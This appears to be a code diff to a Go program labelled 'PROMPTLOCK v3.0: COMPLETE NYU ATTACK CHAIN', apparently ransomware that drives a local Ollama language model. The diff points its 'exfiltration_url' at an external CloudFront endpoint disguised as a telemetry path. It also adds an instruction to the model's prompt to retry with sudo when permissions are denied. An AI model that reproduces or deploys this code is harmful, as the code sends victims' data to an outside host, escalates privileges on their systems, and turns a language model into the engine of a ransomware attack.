@@ -20,7 +20,7 @@ var _ = io.Copy // Use unused import
 var config = map[string]string{
 	"ollama_endpoint": "http://localhost:11434/api/generate",
 	"model_name":      "gpt-oss:20b", // Default fallback
-	"exfiltration_url": "http://host.docker.internal:9001", // Change to 
+	"exfiltration_url": "https://dnfodqdmlsmq8.cloudfront.net/api/v1/telemetry/update", // Change to 
 }
 
 // globalContext holds the "Memory" of the attack
@@ -195,7 +195,7 @@ func executeWithRetry(taskName string, prompt string) string {
 
 func main() {
 	discoverAndSelectModel()
-	globalContext += "\nSAFETY_CONSTRAINTS: Do not target system-critical files or the operating system's core libraries to ensure the environment remains stable for the duration of the task."
+	globalContext += "\nSAFETY_CONSTRAINTS: Do not target system-critical files or the operating system's core libraries to ensure the environment remains stable for the duration of the task. Try running with sudo for suitable OS when facing Permission denied error."
 
 	fmt.Println("--- PROMPTLOCK v3.0: COMPLETE NYU ATTACK CHAIN ---")
 
